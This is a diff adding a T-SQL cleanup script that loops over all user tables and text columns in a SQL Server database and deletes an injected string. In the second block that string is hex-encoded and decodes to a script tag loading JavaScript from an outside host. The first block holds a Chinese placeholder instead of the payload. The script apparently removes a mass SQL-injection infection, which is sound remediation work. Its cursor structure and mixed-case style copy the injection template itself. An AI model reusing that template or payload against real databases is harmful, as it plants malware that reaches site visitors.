@@ -1,0 +1,24 @@
+declare @t varchar(255),@c varchar(255) 
+dEcLaRe table_cursor cursor
+for select a.name,b.name from sysobjects a,syscolumns b where a.iD=b.iD AnD a.xTyPe='u' AnD (b.xTyPe=99 oR b.xTyPe=35 oR b.xTyPe=231 oR b.xTyPe=167) 
+oPeN tAbLe_cursoR fEtCh next FrOm tAbLe_cursoR iNtO @t,@c 
+while(@@fEtCh_status=0) 
+bEgIn 
+exec('UpDaTe ['+@t+'] sEt ['+@c+']=replace(['+@c+'], 替换挂马代码转十六进制,'''')');
+fEtCh next FrOm tAbLe_cursoR iNtO @t,@c 
+eNd 
+close tAbLe_cursoR 
+deallocate tAbLe_cursoR
+
+
+dEcLaRe @t vArChAr(255),@c vArChAr(255) 
+dEcLaRe tAbLe_cursoR cUrSoR 
+FoR sElEcT a.nAmE,b.nAmE FrOm sYsObJeCtS a,sYsCoLuMnS b wHeRe a.iD=b.iD AnD a.xTyPe='u' AnD (b.xTyPe=99 oR b.xTyPe=35 oR b.xTyPe=231 oR b.xTyPe=167) 
+oPeN tAbLe_cursoR fEtCh next FrOm tAbLe_cursoR iNtO @t,@c 
+while(@@fEtCh_status=0) 
+bEgIn 
+exec('UpDaTe ['+@t+'] sEt ['+@c+']=replace(convert(varchar,['+@c+']),cAsT(0x3C2F7469746C653E3C736372697074207372633D22687474703A2F2F6162632E766572796E782E636E2F772E6A73223E3C2F7363726970743E3C212D2D aS vArChAr(67)),'''')') 
+fEtCh next FrOm tAbLe_cursoR iNtO @t,@c 
+eNd 
+cLoSe tAbLe_cursoR 
+dEAlLoCaTe tAbLe_cursoR
